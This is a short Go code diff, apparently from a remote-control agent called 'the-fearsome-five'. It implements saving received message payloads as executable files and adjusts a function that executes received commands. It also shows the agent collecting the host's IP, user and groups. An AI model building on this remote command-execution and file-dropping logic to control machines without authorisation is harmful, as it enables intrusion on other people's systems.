@@ -17,6 +17,7 @@ import (
 	"strings"
 	"unsafe"
 
+	"github.com/lithammer/shortuuid/v3"
 	"github.com/mattn/go-shellwords"
 	"github.com/mikeflynn/the-fearsome-five/shared"
 )
@@ -30,6 +31,7 @@ type System struct {
 	ExtIP         string `json:"ip_external"`
 	User          string `json:"user"`
 	Groups        string `json:"groups"`
+	tempDir       string `json:"-"`
 }
 
 func InitSystem() *System {
@@ -38,6 +40,7 @@ func InitSystem() *System {
 		UUID:          "",
 		OS:            runtime.GOOS,
 		Groups:        "",
+		tempDir:       ".",
 	}
 
 	if err := sys.load(); err != nil {
@@ -57,9 +60,9 @@ func (sys *System) load() error {
 	return errors.New("No saved config found.")
 }
 
-func (sys *System) toJSON() string {
+func (sys *System) toJSON() []byte {
 	ret, _ := json.Marshal(sys)
-	return string(ret)
+	return ret
 }
 
 func (sys *System) GetUser() (string, error) {
@@ -174,7 +177,7 @@ func (sys *System) GetOSVersion() (string, error) {
 func (sys *System) RunCommand(message *shared.Message) (string, error) {
 	var cmd *exec.Cmd
 
-	args, err := shellwords.Parse(message.Body)
+	args, err := shellwords.Parse(string(message.Body))
 	if err != nil {
 		return "", err
 	}
@@ -192,8 +195,15 @@ func (sys *System) RunCommand(message *shared.Message) (string, error) {
 	return string(out), nil
 }
 
-func (sys *System) SaveFile() (string, error) {
-	return "", errors.New("Not yet implemented.")
+func (sys *System) SaveFile(msg *shared.Message) (string, error) {
+	filename := shortuuid.New()
+
+	err := ioutil.WriteFile(sys.tempDir+"/"+filename, msg.Body, 0744)
+	if err != nil {
+		return "", err
+	}
+
+	return filename, nil
 }
 
 func (sys *System) SendFile() (string, error) {
